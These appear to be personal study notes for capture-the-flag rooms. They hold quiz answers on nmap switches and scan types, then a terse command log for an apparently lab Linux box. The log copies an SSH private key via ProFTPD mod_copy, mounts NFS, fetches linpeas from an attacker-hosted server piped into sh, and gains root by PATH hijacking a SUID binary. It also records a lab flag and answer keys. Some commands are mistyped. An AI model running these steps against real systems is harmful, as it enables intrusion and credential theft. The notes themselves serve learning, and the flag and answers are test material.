# nmap

## Task 1  Deploy
- Deploy the attached VM : *sumbit*

## Task 2  Introduction
- What networking constructs are used to direct traffic to the right application on a server? *Ports*
- How many of these are available on any network-enabled computer? *65535*
- [Research] How many of these are considered "well-known"? (These are the "standard" numbers mentioned in the task)? *1024*

## Task 3  Nmap Switches
- What is the first switch listed in the help menu for a 'Syn Scan' (more on this later!)? *-sS*
- Which switch would you use for a "UDP scan"? *-sU*
- If you wanted to detect which operating system the target is running on, which switch would you use? *-O*
- Nmap provides a switch to detect the version of the services running on the target. What is this switch? *-sV*
- The default output provided by nmap often does not provide enough information for a pentester. How would you increase the verbosity? *-v*
- Verbosity level one is good, but verbosity level two is better! How would you set the verbosity level to two? *-vv*
- What switch would you use to save the nmap results in three major formats? *-oA*
- What switch would you use to save the nmap results in a "normal" format? *-oN*
- A very useful output format: how would you save results in a "grepable" format? *-oG*
- How would you activate this setting? *-A*
- How would you set the timing template to level 5? *-T5*
- How would you tell nmap to only scan port 80? *-p 80*
- How would you tell nmap to scan ports 1000-1500? *-p 1000-1500*
- How would you tell nmap to scan all ports? *-p-*
- How would you activate a script from the nmap scripting library (lots more on this later!)? *--script*
- How would you activate all of the scripts in the "vuln" category? *--script=vuln*

## Task 4  Scan Types Overview
- Read the Scan Types Introduction.? *submit*

## Task 5  Scan Types TCP Connect Scans
- Which RFC defines the appropriate behaviour for the TCP protocol? *RFC 9293*
- If a port is closed, which flag should the server send back to indicate this? *RST*

## Task 6  Scan Types SYN Scans
- There are two other names for a SYN scan, what are they? *Half-Open, Stealth*
- Can Nmap use a SYN scan without Sudo permissions (Y/N)? *N*

## Task 7  Scan Types UDP Scans
- If a UDP port doesn't respond to an Nmap scan, what will it be marked as? *open|filtered*
- When a UDP port is closed, by convention the target should send back a "port unreachable" message. Which protocol would it use to do so? *ICMP*

## Task 8  Scan Types NULL, FIN and Xmas
- Which of the three shown scan types uses the URG flag? *xmas*
- Why are NULL, FIN and Xmas scans generally used? *Firewall Evasion*
- Which common OS may respond to a NULL, FIN or Xmas scan with a RST for every port? *Microsoft Windows*

## Task 9  Scan Types ICMP Network Scanning
- How would you perform a ping sweep on the 172.16.x.x network (Netmask: 255.255.0.0) using Nmap? (CIDR notation)? *nmap -sn 172.16.0.0/16*

## Task 10  NSE Scripts Overview
- What language are NSE scripts written in? *Lua*
- Which category of scripts would be a very bad idea to run in a production environment? *intrusive*

## Task 11  NSE Scripts Working with the NSE
## Task 12  NSE Scripts Searching for Scripts
## Task 13  Firewall Evasion
## Task 14  Practical
## Task 15  Conclusion







## samba
```
nmap -vvv
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.166.158

smbclient //10.10.10.10/anonymous
smbget -R smb://10.10.166.158/anonymous

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.166.158
searsearchsploit proftpd 1.3.5

nc 10.10.166.158 21 / netcat => network cat
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

mkdir /mnt/kenobiNFS
sudo mount 10.10.166.158:/var /mnt/kenobi
ls -al /mnt/kenobi

cp /mnt/kenobi/tmp/id_rsa id_rsa
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.166.158

d0b0f3f53b6caa532a83915e19224899
```

```
find / -perm -u=s -type f 2>/dev/null
usr/bin/menu

sudo python3 -m http-server 80
wget http://ur_ip/linpeas.sh | sh
curl ur_ip/linpeas.sh | sh

if u got /usr/bin/menu
u can use menu
- menu

- strings /usr/bin/menu
env => environment variable

echo bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH

menu: 1
# (user root now)
```